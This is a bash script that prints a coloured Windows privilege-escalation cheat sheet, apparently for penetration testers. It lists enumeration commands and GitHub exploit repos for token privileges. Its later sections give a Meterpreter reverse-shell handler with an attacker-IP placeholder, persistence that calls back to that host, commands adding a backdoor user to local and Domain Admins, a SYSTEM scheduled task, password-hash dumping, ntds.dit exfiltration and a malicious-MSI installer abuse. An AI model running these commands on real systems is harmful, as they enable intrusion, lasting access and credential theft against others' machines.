#!/bin/bash

# === Color Variables ===
HEADER='\033[1;34m'
SUBHEADER='\033[1;33m'
COMMAND='\033[1;32m'
RESET='\033[0m'

# =======================
# TL;DR Windows PrivEsc
# =======================

echo -e "${HEADER}+-------------------------------+"
echo -e "|       INITIAL ENUMERATION     |"
echo -e "+-------------------------------+${RESET}"

echo -e "\n${SUBHEADER}#-> DOMAIN ENUM (if joined)${RESET}"
echo -e "${COMMAND}BloodHound / SharpHound${RESET}"

echo -e "\n${SUBHEADER}#-> WHOAMI${RESET}"
echo -e "${COMMAND}whoami${RESET}"
echo -e "${COMMAND}echo %username%${RESET}"

echo -e "\n${SUBHEADER}#-> PRIVILEGES${RESET}"
echo -e "${COMMAND}whoami /priv${RESET}"

echo -e "\n${SUBHEADER}#-> SYSTEM INFO${RESET}"
echo -e "${COMMAND}systeminfo${RESET}"
echo -e "${COMMAND}wmic os get Caption,CSDVersion,OSArchitecture,Version${RESET}"

echo -e "\n${SUBHEADER}#-> SERVICES${RESET}"
echo -e "${COMMAND}wmic service get name,startname${RESET}"
echo -e "${COMMAND}net start${RESET}"

echo -e "\n${SUBHEADER}#-> ADMIN CHECK${RESET}"
echo -e "${COMMAND}net localgroup administrators${RESET}"
echo -e "${COMMAND}net user${RESET}"

echo -e "\n${SUBHEADER}#-> NETWORK${RESET}"
echo -e "${COMMAND}netstat -anoy${RESET}"
echo -e "${COMMAND}route print${RESET}"
echo -e "${COMMAND}arp -A${RESET}"
echo -e "${COMMAND}ipconfig /all${RESET}"

echo -e "\n${SUBHEADER}#-> USERS${RESET}"
echo -e "${COMMAND}net users${RESET}"
echo -e "${COMMAND}net user${RESET}"
echo -e "${COMMAND}net localgroup${RESET}"

echo -e "\n${SUBHEADER}#-> FIREWALL${RESET}"
echo -e "${COMMAND}netsh advfirewall firewall show rule name=all${RESET}"

echo -e "\n${SUBHEADER}#-> SCHEDULED TASKS${RESET}"
echo -e "${COMMAND}schtasks /query /fo LIST /v > schtasks.txt${RESET}"

echo -e "\n${SUBHEADER}#-> INSTALLATION RIGHTS (AlwaysInstallElevated)${RESET}"
echo -e "${COMMAND}reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated${RESET}"
echo -e "${COMMAND}reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated${RESET}"

echo -e "\n${HEADER}+-----------------------------------------------------------------------+"
echo -e "|     WINDOWS PRIV ESC: GITHUB EXPLOITS                                 |"
echo -e "+-----------------------------------------------------------------------+${RESET}"

echo -e "${COMMAND}Privilege Name              | GitHub PoC${RESET}"
echo -e "${COMMAND}----------------------------|-----------------------------------------${RESET}"
echo -e "${COMMAND}SeDebugPrivilege            | github.com/bruno-1337/SeDebugPrivilege-${RESET}"
echo -e "${COMMAND}SeImpersonatePrivilege      | github.com/itm4n/PrintSpoofer${RESET}"
echo -e "${COMMAND}SeAssignPrimaryToken        | github.com/b4rdia/HackTricks${RESET}"
echo -e "${COMMAND}SeTcbPrivilege              | github.com/hatRiot/token-priv${RESET}"
echo -e "${COMMAND}SeCreateTokenPrivilege      | github.com/hatRiot/token-priv${RESET}"
echo -e "${COMMAND}SeLoadDriverPrivilege       | github.com/k4sth4/SeLoadDriverPrivilege${RESET}"
echo -e "${COMMAND}SeTakeOwnershipPrivilege    | github.com/hatRiot/token-priv${RESET}"
echo -e "${COMMAND}SeRestorePrivilege          | github.com/xct/SeRestoreAbuse${RESET}"
echo -e "${COMMAND}SeBackupPrivilege           | github.com/k4sth4/SeBackupPrivilege${RESET}"
echo -e "${COMMAND}SeIncreaseQuotaPrivilege    | github.com/b4rdia/HackTricks${RESET}"
echo -e "${COMMAND}SeSystemEnvironment         | github.com/b4rdia/HackTricks${RESET}"
echo -e "${COMMAND}SeMachineAccount            | github.com/b4rdia/HackTricks${RESET}"
echo -e "${COMMAND}SeTrustedCredManAccess      | learn.microsoft.com/...trusted-caller${RESET}"
echo -e "${COMMAND}SeRelabelPrivilege          | github.com/decoder-it/RelabelAbuse${RESET}"
echo -e "${COMMAND}SeManageVolumePrivilege     | github.com/CsEnox/SeManageVolumeExploit${RESET}"
echo -e "${COMMAND}SeCreateGlobalPrivilege     | github.com/b4rdia/HackTricks${RESET}"

echo -e "\n${SUBHEADER}Notes:${RESET}"
echo -e "- PrintSpoofer is gold for SeImpersonatePrivilege."
echo -e "- SeManageVolume has practical field PoCs."

echo -e "\n${HEADER}+----------------------------+"
echo -e "|     MAINTAINING ACCESS     |"
echo -e "+----------------------------+${RESET}"

echo -e "\n${SUBHEADER}> METERPRETER REVERSE SHELL SETUP${RESET}"
echo -e "${COMMAND}msfconsole${RESET}"
echo -e "${COMMAND}use exploit/multi/handler${RESET}"
echo -e "${COMMAND}set PAYLOAD windows/meterpreter/reverse_tcp${RESET}"
echo -e "${COMMAND}set LHOST <attacker_ip>${RESET}"
echo -e "${COMMAND}set LPORT <port>${RESET}"
echo -e "${COMMAND}exploit${RESET}"

echo -e "\n${SUBHEADER}> PERSISTENCE${RESET}"
echo -e "${COMMAND}meterpreter > run persistence -U -i 5 -p 443 -r <LHOST>${RESET}"

echo -e "\n${SUBHEADER}> PORT FORWARDING${RESET}"
echo -e "${COMMAND}meterpreter > portfwd add -l 3306 -p 3306 -r <target_ip>${RESET}"

echo -e "\n${SUBHEADER}> SYSTEM MIGRATION${RESET}"
echo -e "${COMMAND}meterpreter > run post/windows/manage/migrate${RESET}"
echo -e "${COMMAND}meterpreter > migrate <PID>${RESET}"

echo -e "\n${SUBHEADER}> EXECUTE PAYLOADS${RESET}"
echo -e "${COMMAND}powershell.exe \"C:\\\\Tools\\\\privesc.ps1\"${RESET}"

echo -e "\n${HEADER}+-------------------------------+"
echo -e "|        PRIVES EC CHECKLIST    |"
echo -e "+-------------------------------+${RESET}"

echo -e "\n${SUBHEADER}> UNQUOTED SERVICE PATHS${RESET}"
echo -e "${COMMAND}wmic service get name,displayname,pathname,startmode | findstr /i \"auto\" | findstr /v \"C:\\\\Windows\" | findstr /v '\"'${RESET}"

echo -e "\n${SUBHEADER}> WEAK SERVICE PERMISSIONS${RESET}"
echo -e "${COMMAND}accesschk.exe -uwcqv <service>${RESET}"
echo -e "${COMMAND}sc qc <service>${RESET}"
echo -e "${COMMAND}icacls \"C:\\\\Path\\\\To\\\\Service.exe\"${RESET}"

echo -e "\n${SUBHEADER}> FILE TRANSFER OPTIONS${RESET}"
echo -e "${COMMAND}certutil.exe${RESET}"
echo -e "${COMMAND}powershell (IEX)${RESET}"
echo -e "${COMMAND}SMB / FTP / TFTP / VBScript${RESET}"

echo -e "\n${SUBHEADER}> CLEAR TEXT CREDENTIALS${RESET}"
echo -e "${COMMAND}findstr /si password *.txt *.xml *.ini${RESET}"
echo -e "${COMMAND}dir /s *pass* == *cred* == *.config*${RESET}"

echo -e "\n${SUBHEADER}> WEAK FILE PERMISSIONS${RESET}"
echo -e "${COMMAND}accesschk.exe -uwqs Users c:\\*.*${RESET}"
echo -e "${COMMAND}accesschk.exe -uwqs \"Authenticated Users\" c:\\*.*${RESET}"

echo -e "\n${SUBHEADER}> NEW ADMIN USER (Local/Domain)${RESET}"
echo -e "${COMMAND}net user siren P@ssw0rd! /add${RESET}"
echo -e "${COMMAND}net localgroup administrators siren /add${RESET}"
echo -e "${COMMAND}net group \"Domain Admins\" siren /add /domain${RESET}"

echo -e "\n${HEADER}+--------------------------------+"
echo -e "|     SCHEDULED TASK ABUSE       |"
echo -e "+--------------------------------+${RESET}"

echo -e "\n${SUBHEADER}> ENUM${RESET}"
echo -e "${COMMAND}schtasks /query /fo LIST /v > tasks.txt${RESET}"

echo -e "\n${SUBHEADER}> CREATE SYSTEM TASK${RESET}"
echo -e "${COMMAND}schtasks /create /ru SYSTEM /sc MINUTE /mo 5 /tn RUNME /tr \"C:\\\\Tools\\\\sirenMaint.exe\"${RESET}"

echo -e "\n${SUBHEADER}> RUN TASK${RESET}"
echo -e "${COMMAND}schtasks /run /tn \"RUNME\"${RESET}"

echo -e "\n${HEADER}+-------------------------------+"
echo -e "|    POST EXPLOIT ENUMERATION   |"
echo -e "+-------------------------------+${RESET}"

echo -e "\n${SUBHEADER}> NETWORK USERS${RESET}"
echo -e "${COMMAND}net user${RESET}"
echo -e "${COMMAND}net user <target>${RESET}"
echo -e "${COMMAND}net localgroup administrators${RESET}"

echo -e "\n${SUBHEADER}> NT AUTHORITY CHECKS${RESET}"
echo -e "${COMMAND}whoami${RESET}"
echo -e "${COMMAND}accesschk.exe /accepteula${RESET}"
echo -e "${COMMAND}MS09-012.exe \"whoami\"${RESET}"

echo -e "\n${SUBHEADER}> HASH DUMP${RESET}"
echo -e "${COMMAND}meterpreter > hashdump${RESET}"

echo -e "\n${SUBHEADER}> EXFILTRATE ntds.dit${RESET}"
echo -e "${COMMAND}Use secretsdump.py or disk capture tools${RESET}"

echo -e "\n${SUBHEADER}> INSTALLER ABUSE${RESET}"
echo -e "${COMMAND}AlwaysInstallElevated = 1${RESET}"
echo -e "${COMMAND}msiexec /i evil.msi${RESET}"

echo -e "\n${SUBHEADER}> SHARE ENUMERATION${RESET}"
echo -e "${COMMAND}net share${RESET}"
echo -e "${COMMAND}net use${RESET}"
echo -e "${COMMAND}net use Z: \\\\TARGET\\\\SHARE /persistent:yes${RESET}"

echo -e "\n${HEADER}+----------------------------+"
echo -e "|   TOOLKIT / RESOURCES       |"
echo -e "+----------------------------+${RESET}"

echo -e "\n${COMMAND}> Windows Exploit Suggester:${RESET}"
echo -e "${COMMAND}https://github.com/AonCyberLabs/Windows-Exploit-Suggester${RESET}"

echo -e "\n${COMMAND}> Cross Compile Payloads (Linux > Windows):${RESET}"
echo -e "${COMMAND}apt-get install mingw-w64${RESET}"
echo -e "${COMMAND}i686-w64-mingw32-gcc hello.c -o hello.exe${RESET}"
echo -e "${COMMAND}x86_64-w64-mingw32-gcc hello.c -o hello64.exe${RESET}"

echo -e "\n${COMMAND}> Additional Reading:${RESET}"
echo -e "${COMMAND}https://www.fuzzysecurity.com/tutorials/16.html${RESET}"
echo -e "${COMMAND}https://book.hacktricks.xyz/windows/windows-local-privilege-escalation${RESET}"

echo -e "\n${YELLOW}${BOLD}# Done! Full Windows PrivEsc cheat sheet printed.${RESET}"
